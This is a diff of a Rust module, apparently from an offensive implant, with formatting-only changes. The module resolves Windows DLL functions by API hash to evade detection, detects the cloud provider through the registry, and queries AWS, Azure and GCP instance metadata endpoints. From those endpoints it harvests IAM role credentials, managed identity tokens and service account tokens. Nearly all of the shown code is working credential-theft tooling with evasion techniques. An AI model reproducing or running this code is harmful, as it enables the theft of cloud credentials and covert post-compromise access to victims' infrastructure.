@@ -32,8 +32,8 @@ use std::mem;
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
@@ -42,8 +42,8 @@ use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 // ═══════════════════════════════════════════════════════════════════════════
 
 const ADVAPI32_DLL_W: &[u16] = &[
-    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_W);
 const FN_REG_OPEN_KEY_EX_W: u32 = hash_str_const(b"RegOpenKeyExW");
@@ -71,7 +71,8 @@ const IMDS_IP: &str = "169.254.169.254";
 const AWS_IMDS_BASE: &str = "http://169.254.169.254/latest/meta-data/";
 const AWS_IMDS_TOKEN: &str = "http://169.254.169.254/latest/api/token";
 const AZURE_IMDS_BASE: &str = "http://169.254.169.254/metadata/instance?api-version=2021-02-01";
-const AZURE_IMDS_TOKEN: &str = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01";
+const AZURE_IMDS_TOKEN: &str =
+    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01";
 const GCP_IMDS_BASE: &str = "http://metadata.google.internal/computeMetadata/v1/";
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -160,7 +161,14 @@ pub struct CloudResources {
 
 struct RegFns {
     reg_open_key_ex_w: unsafe extern "system" fn(HKEY, *const u16, DWORD, DWORD, *mut HKEY) -> LONG,
-    reg_query_value_ex_w: unsafe extern "system" fn(HKEY, *const u16, *mut DWORD, *mut DWORD, LPBYTE, *mut DWORD) -> LONG,
+    reg_query_value_ex_w: unsafe extern "system" fn(
+        HKEY,
+        *const u16,
+        *mut DWORD,
+        *mut DWORD,
+        LPBYTE,
+        *mut DWORD,
+    ) -> LONG,
     reg_close_key: unsafe extern "system" fn(HKEY) -> LONG,
 }
 
@@ -319,8 +327,8 @@ fn detect_cloud_provider_registry(reg: &RegFns) -> CloudProvider {
 // ═══════════════════════════════════════════════════════════════════════════
 
 const WINHTTP_DLL_W: &[u16] = &[
-    'w' as u16, 'i' as u16, 'n' as u16, 'h' as u16, 't' as u16, 't' as u16,
-    'p' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'w' as u16, 'i' as u16, 'n' as u16, 'h' as u16, 't' as u16, 't' as u16, 'p' as u16, '.' as u16,
+    'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_WINHTTP_DLL: u32 = hash_wstr_const(WINHTTP_DLL_W);
 
@@ -349,7 +357,15 @@ const WINHTTP_FLAG_BYPASS_PROXY_CACHE: DWORD = 0x0100;
 struct WinHttpFns {
     open: unsafe extern "system" fn(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD) -> HINTERNET,
     connect: unsafe extern "system" fn(HINTERNET, LPCWSTR, u16, DWORD) -> HINTERNET,
-    open_request: unsafe extern "system" fn(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, *const *const u16, DWORD) -> HINTERNET,
+    open_request: unsafe extern "system" fn(
+        HINTERNET,
+        LPCWSTR,
+        LPCWSTR,
+        LPCWSTR,
+        LPCWSTR,
+        *const *const u16,
+        DWORD,
+    ) -> HINTERNET,
     send_request: unsafe extern "system" fn(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD) -> i32,
     receive_response: unsafe extern "system" fn(HINTERNET) -> i32,
     read_data: unsafe extern "system" fn(HINTERNET, LPVOID, DWORD, *mut DWORD) -> i32,
@@ -367,8 +383,9 @@ impl WinHttpFns {
             ($hash:expr) => {
                 unsafe {
                     mem::transmute(
-                        pe_resolve::get_proc_address_by_hash(base, $hash)
-                            .ok_or_else(|| anyhow!("winhttp function not found (hash {:08X})", $hash))?,
+                        pe_resolve::get_proc_address_by_hash(base, $hash).ok_or_else(|| {
+                            anyhow!("winhttp function not found (hash {:08X})", $hash)
+                        })?,
                     )
                 }
             };
@@ -408,13 +425,22 @@ impl Drop for WinHttpHandle {
 
 /// Parse a URL into (host, port, path).
 fn parse_url(url: &str) -> Result<(String, u16, String)> {
-    let rest = url.strip_prefix("http://").ok_or_else(|| anyhow!("only http:// supported for IMDS"))?;
+    let rest = url
+        .strip_prefix("http://")
+        .ok_or_else(|| anyhow!("only http:// supported for IMDS"))?;
     let slash_pos = rest.find('/').unwrap_or(rest.len());
     let host_port = &rest[..slash_pos];
-    let path = if slash_pos < rest.len() { &rest[slash_pos..] } else { "/" };
+    let path = if slash_pos < rest.len() {
+        &rest[slash_pos..]
+    } else {
+        "/"
+    };
 
     let (host, port) = if let Some(colon) = host_port.find(':') {
-        (host_port[..colon].to_string(), host_port[colon+1..].parse().unwrap_or(80))
+        (
+            host_port[..colon].to_string(),
+            host_port[colon + 1..].parse().unwrap_or(80),
+        )
     } else {
         (host_port.to_string(), 80)
     };
@@ -428,33 +454,61 @@ fn http_get(url: &str, headers: &[(&str, &str)], timeout_ms: u64) -> Result<Stri
     let (host, port, path) = parse_url(url)?;
 
     let agent_w = str_to_wide("Mozilla/5.0");
-    let session = unsafe { (fns.open)(agent_w.as_ptr(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, ptr::null(), ptr::null(), 0) };
+    let session = unsafe {
+        (fns.open)(
+            agent_w.as_ptr(),
+            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+            ptr::null(),
+            ptr::null(),
+            0,
+        )
+    };
     if session.is_null() {
         bail!("WinHttpOpen failed");
     }
-    let _session_guard = WinHttpHandle { handle: session, fns: unsafe { &*(&fns as *const WinHttpFns) } };
+    let _session_guard = WinHttpHandle {
+        handle: session,
+        fns: unsafe { &*(&fns as *const WinHttpFns) },
+    };
 
     let host_w = str_to_wide(&host);
     let conn = unsafe { (fns.connect)(session, host_w.as_ptr(), port, 0) };
     if conn.is_null() {
         bail!("WinHttpConnect to {}:{} failed", host, port);
     }
-    let _conn_guard = WinHttpHandle { handle: conn, fns: unsafe { &*(&fns as *const WinHttpFns) } };
+    let _conn_guard = WinHttpHandle {
+        handle: conn,
+        fns: unsafe { &*(&fns as *const WinHttpFns) },
+    };
 
     let path_w = str_to_wide(&path);
     let get_w = str_to_wide("GET");
-    let req = unsafe { (fns.open_request)(conn, get_w.as_ptr(), path_w.as_ptr(), ptr::null(), ptr::null(), ptr::null(), WINHTTP_FLAG_BYPASS_PROXY_CACHE) };
+    let req = unsafe {
+        (fns.open_request)(
+            conn,
+            get_w.as_ptr(),
+            path_w.as_ptr(),
+            ptr::null(),
+            ptr::null(),
+            ptr::null(),
+            WINHTTP_FLAG_BYPASS_PROXY_CACHE,
+        )
+    };
     if req.is_null() {
         bail!("WinHttpOpenRequest failed for {}", path);
     }
-    let _req_guard = WinHttpHandle { handle: req, fns: unsafe { &*(&fns as *const WinHttpFns) } };
+    let _req_guard = WinHttpHandle {
+        handle: req,
+        fns: unsafe { &*(&fns as *const WinHttpFns) },
+    };
 
     // Add custom headers
     for (key, value) in headers {
         let header_str = format!("{}: {}", key, value);
         let header_w = str_to_wide(&header_str);
         let header_len = (header_str.len() * 2) as DWORD;
-        unsafe { (fns.add_request_headers)(req, header_w.as_ptr(), header_len, 0x20000000) }; // WINHTTP_ADDREQ_FLAG_ADD
+        unsafe { (fns.add_request_headers)(req, header_w.as_ptr(), header_len, 0x20000000) };
+        // WINHTTP_ADDREQ_FLAG_ADD
     }
 
     // Send request
@@ -495,26 +549,53 @@ fn http_put(url: &str, headers: &[(&str, &str)], timeout_ms: u64) -> Result<Stri
     let (host, port, path) = parse_url(url)?;
 
     let agent_w = str_to_wide("Mozilla/5.0");
-    let session = unsafe { (fns.open)(agent_w.as_ptr(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, ptr::null(), ptr::null(), 0) };
+    let session = unsafe {
+        (fns.open)(
+            agent_w.as_ptr(),
+            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+            ptr::null(),
+            ptr::null(),
+            0,
+        )
+    };
     if session.is_null() {
         bail!("WinHttpOpen failed");
     }
-    let _session_guard = WinHttpHandle { handle: session, fns: unsafe { &*(&fns as *const WinHttpFns) } };
+    let _session_guard = WinHttpHandle {
+        handle: session,
+        fns: unsafe { &*(&fns as *const WinHttpFns) },
+    };
 
     let host_w = str_to_wide(&host);
     let conn = unsafe { (fns.connect)(session, host_w.as_ptr(), port, 0) };
     if conn.is_null() {
         bail!("WinHttpConnect to {}:{} failed", host, port);
     }
-    let _conn_guard = WinHttpHandle { handle: conn, fns: unsafe { &*(&fns as *const WinHttpFns) } };
+    let _conn_guard = WinHttpHandle {
+        handle: conn,
+        fns: unsafe { &*(&fns as *const WinHttpFns) },
+    };
 
     let path_w = str_to_wide(&path);
     let put_w = str_to_wide("PUT");
-    let req = unsafe { (fns.open_request)(conn, put_w.as_ptr(), path_w.as_ptr(), ptr::null(), ptr::null(), ptr::null(), WINHTTP_FLAG_BYPASS_PROXY_CACHE) };
+    let req = unsafe {
+        (fns.open_request)(
+            conn,
+            put_w.as_ptr(),
+            path_w.as_ptr(),
+            ptr::null(),
+            ptr::null(),
+            ptr::null(),
+            WINHTTP_FLAG_BYPASS_PROXY_CACHE,
+        )
+    };
     if req.is_null() {
         bail!("WinHttpOpenRequest (PUT) failed for {}", path);
     }
-    let _req_guard = WinHttpHandle { handle: req, fns: unsafe { &*(&fns as *const WinHttpFns) } };
+    let _req_guard = WinHttpHandle {
+        handle: req,
+        fns: unsafe { &*(&fns as *const WinHttpFns) },
+    };
 
     // Add custom headers
     for (key, value) in headers {
@@ -604,7 +685,11 @@ fn query_aws_imds(token: &str) -> Result<CloudEnvironment> {
 
     let vpc_id = if !mac.is_empty() {
         http_get(
-            &format!("{}network/interfaces/macs/{}/vpc-id", AWS_IMDS_BASE, mac.trim()),
+            &format!(
+                "{}network/interfaces/macs/{}/vpc-id",
+                AWS_IMDS_BASE,
+                mac.trim()
+            ),
             &[auth_header.clone()],
             5000,
         )
@@ -615,7 +700,11 @@ fn query_aws_imds(token: &str) -> Result<CloudEnvironment> {
 
     let subnet_id = if !mac.is_empty() {
         http_get(
-            &format!("{}network/interfaces/macs/{}/subnet-id", AWS_IMDS_BASE, mac.trim()),
+            &format!(
+                "{}network/interfaces/macs/{}/subnet-id",
+                AWS_IMDS_BASE,
+                mac.trim()
+            ),
             &[auth_header],
             5000,
         )
@@ -634,7 +723,12 @@ fn query_aws_imds(token: &str) -> Result<CloudEnvironment> {
         subnet_id: subnet_id.trim().to_string(),
         iam_role: iam_role.trim().to_string(),
         imds_accessible: true,
-        imds_raw: format!("id={} type={} region={}", instance_id.trim(), instance_type.trim(), region.trim()),
+        imds_raw: format!(
+            "id={} type={} region={}",
+            instance_id.trim(),
+            instance_type.trim(),
+            region.trim()
+        ),
     })
 }
 
@@ -660,11 +754,7 @@ fn query_aws_credentials(token: &str, role_name: &str) -> Result<CloudCredential
 // ── Azure IMDS ───────────────────────────────────────────────────────────
 
 fn query_azure_imds() -> Result<CloudEnvironment> {
-    let body = http_get(
-        AZURE_IMDS_BASE,
-        &[("Metadata", "true")],
-        5000,
-    )?;
+    let body = http_get(AZURE_IMDS_BASE, &[("Metadata", "true")], 5000)?;
 
     let vm_id = extract_json_field(&body, "vmId");
     let vm_size = extract_json_field(&body, "vmSize");
@@ -681,14 +771,21 @@ fn query_azure_imds() -> Result<CloudEnvironment> {
         subnet_id: extract_json_field(&body, "subnet"),
         iam_role: extract_json_field(&body, "identityType"),
         imds_accessible: true,
-        imds_raw: if body.len() > 500 { body[..500].to_string() } else { body },
+        imds_raw: if body.len() > 500 {
+            body[..500].to_string()
+        } else {
+            body
+        },
     })
 }
 
 fn query_azure_credentials() -> Result<CloudCredentials> {
     let body = http_get(
         AZURE_IMDS_TOKEN,
-        &[("Metadata", "true"), ("Resource", "https://management.azure.com/")],
+        &[
+            ("Metadata", "true"),
+            ("Resource", "https://management.azure.com/"),
+        ],
         5000,
     )?;
 
@@ -728,16 +825,17 @@ fn query_gcp_imds() -> Result<CloudEnvironment> {
         subnet_id: extract_json_field(&body, "networkInterfaces/0/subnetwork"),
         iam_role: extract_json_field(&body, "serviceAccounts/0/email"),
         imds_accessible: true,
-        imds_raw: if body.len() > 500 { body[..500].to_string() } else { body },
+        imds_raw: if body.len() > 500 {
+            body[..500].to_string()
+        } else {
+            body
+        },
     })
 }
 
 fn query_gcp_credentials() -> Result<CloudCredentials> {
     let body = http_get(
-        &format!(
-            "{}instance/service-accounts/default/token",
-            GCP_IMDS_BASE
-        ),
+        &format!("{}instance/service-accounts/default/token", GCP_IMDS_BASE),
         &[("Metadata-Flavor", "Google")],
         5000,
     )?;
@@ -775,7 +873,9 @@ fn extract_json_field(json: &str, field: &str) -> String {
             }
         } else {
             // Number or other value — take until comma, brace, or whitespace
-            let end = after.find(|c: char| c == ',' || c == '}' || c == ']' || c == '\n').unwrap_or(after.len());
+            let end = after
+                .find(|c: char| c == ',' || c == '}' || c == ']' || c == '\n')
+                .unwrap_or(after.len());
             return after[..end].trim().to_string();
         }
     }
@@ -834,12 +934,10 @@ pub fn fingerprint_cloud_environment() -> Result<CloudEnvironment> {
                 &[("X-aws-ec2-metadata-token-ttl-seconds", "21600")],
                 3000,
             ) {
-                Ok(token) => {
-                    match query_aws_imds(&token) {
-                        Ok(env) => return Ok(env),
-                        Err(e) => warn!("Cloud: AWS IMDS query failed: {}", e),
-                    }
-                }
+                Ok(token) => match query_aws_imds(&token) {
+                    Ok(env) => return Ok(env),
+                    Err(e) => warn!("Cloud: AWS IMDS query failed: {}", e),
+                },
                 Err(e) => warn!("Cloud: AWS IMDSv2 token failed: {}", e),
             }
 
@@ -861,41 +959,37 @@ pub fn fingerprint_cloud_environment() -> Result<CloudEnvironment> {
             }
         }
 
-        CloudProvider::Azure => {
-            match query_azure_imds() {
-                Ok(env) => Ok(env),
-                Err(_) => Ok(CloudEnvironment {
-                    provider: CloudProvider::Azure,
-                    instance_id: String::new(),
-                    instance_type: String::new(),
-                    region: String::new(),
-                    availability_zone: String::new(),
-                    network_id: String::new(),
-                    subnet_id: String::new(),
-                    iam_role: String::new(),
-                    imds_accessible: false,
-                    imds_raw: String::new(),
-                }),
-            }
-        }
+        CloudProvider::Azure => match query_azure_imds() {
+            Ok(env) => Ok(env),
+            Err(_) => Ok(CloudEnvironment {
+                provider: CloudProvider::Azure,
+                instance_id: String::new(),
+                instance_type: String::new(),
+                region: String::new(),
+                availability_zone: String::new(),
+                network_id: String::new(),
+                subnet_id: String::new(),
+                iam_role: String::new(),
+                imds_accessible: false,
+                imds_raw: String::new(),
+            }),
+        },
 
-        CloudProvider::Gcp => {
-            match query_gcp_imds() {
-                Ok(env) => Ok(env),
-                Err(_) => Ok(CloudEnvironment {
-                    provider: CloudProvider::Gcp,
-                    instance_id: String::new(),
-                    instance_type: String::new(),
-                    region: String::new(),
-                    availability_zone: String::new(),
-                    network_id: String::new(),
-                    subnet_id: String::new(),
-                    iam_role: String::new(),
-                    imds_accessible: false,
-                    imds_raw: String::new(),
-                }),
-            }
-        }
+        CloudProvider::Gcp => match query_gcp_imds() {
+            Ok(env) => Ok(env),
+            Err(_) => Ok(CloudEnvironment {
+                provider: CloudProvider::Gcp,
+                instance_id: String::new(),
+                instance_type: String::new(),
+                region: String::new(),
+                availability_zone: String::new(),
+                network_id: String::new(),
+                subnet_id: String::new(),
+                iam_role: String::new(),
+                imds_accessible: false,
+                imds_raw: String::new(),
+            }),
+        },
 
         CloudProvider::Unknown => unreachable!(),
     }
@@ -930,7 +1024,10 @@ pub fn enumerate_cloud_resources(cloud_env: &CloudEnvironment) -> Result<CloudRe
                 if !cloud_env.iam_role.is_empty() {
                     match query_aws_credentials(&token, &cloud_env.iam_role) {
                         Ok(creds) => {
-                            info!("Cloud: obtained AWS IAM credentials for role {}", cloud_env.iam_role);
+                            info!(
+                                "Cloud: obtained AWS IAM credentials for role {}",
+                                cloud_env.iam_role
+                            );
                             credentials.push(creds);
                         }
                         Err(e) => warn!("Cloud: failed to get AWS credentials: {}", e),
@@ -939,25 +1036,21 @@ pub fn enumerate_cloud_resources(cloud_env: &CloudEnvironment) -> Result<CloudRe
             }
         }
 
-        CloudProvider::Azure => {
-            match query_azure_credentials() {
-                Ok(creds) => {
-                    info!("Cloud: obtained Azure managed identity token");
-                    credentials.push(creds);
-                }
-                Err(e) => warn!("Cloud: failed to get Azure credentials: {}", e),
+        CloudProvider::Azure => match query_azure_credentials() {
+            Ok(creds) => {
+                info!("Cloud: obtained Azure managed identity token");
+                credentials.push(creds);
             }
-        }
+            Err(e) => warn!("Cloud: failed to get Azure credentials: {}", e),
+        },
 
-        CloudProvider::Gcp => {
-            match query_gcp_credentials() {
-                Ok(creds) => {
-                    info!("Cloud: obtained GCP service account token");
-                    credentials.push(creds);
-                }
-                Err(e) => warn!("Cloud: failed to get GCP credentials: {}", e),
+        CloudProvider::Gcp => match query_gcp_credentials() {
+            Ok(creds) => {
+                info!("Cloud: obtained GCP service account token");
+                credentials.push(creds);
             }
-        }
+            Err(e) => warn!("Cloud: failed to get GCP credentials: {}", e),
+        },
 
         CloudProvider::Unknown => {
             debug!("Cloud: no provider to enumerate resources from");
@@ -1152,7 +1245,10 @@ mod tests {
             "Expiration": "2024-01-15T18:00:00Z"
         }"#;
 
-        assert_eq!(extract_json_field(json, "AccessKeyId"), "AKIAIOSFODNN7EXAMPLE");
+        assert_eq!(
+            extract_json_field(json, "AccessKeyId"),
+            "AKIAIOSFODNN7EXAMPLE"
+        );
         assert_eq!(extract_json_field(json, "Code"), "Success");
     }
 
